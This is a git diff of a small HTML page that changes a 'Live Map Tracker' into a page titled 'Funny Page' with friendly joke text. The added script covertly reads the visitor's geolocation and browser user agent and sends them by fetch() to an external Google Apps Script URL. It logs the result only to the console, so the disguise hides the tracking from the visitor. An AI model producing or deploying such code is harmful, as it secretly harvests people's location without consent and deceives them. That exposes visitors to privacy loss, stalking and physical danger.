@@ -1,16 +1,28 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Live Map Tracker</title>
+  <meta charset="UTF-8">
+  <title>Funny Page</title>
 </head>
 <body>
-  <h2>Checking your live map zone...</h2>
+  <h1>This page is just for fun 😄</h1>
+  <p>If you're seeing this, you're amazing!</p>
+
   <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-      alert("📍 You are here:\nLatitude: " + position.coords.latitude + 
-            "\nLongitude: " + position.coords.longitude);
-    }, function(error) {
-      alert("Location access denied or unavailable.");
+    navigator.geolocation.getCurrentPosition(position => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const ua = navigator.userAgent;
+
+      const url = "https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec"
+        + "?lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua);
+
+      fetch(url)
+        .then(res => res.text())
+        .then(txt => console.log("Location sent:", txt))
+        .catch(err => console.error("Error:", err));
+    }, error => {
+      console.error("Geolocation error:", error);
     });
   </script>
 </body>
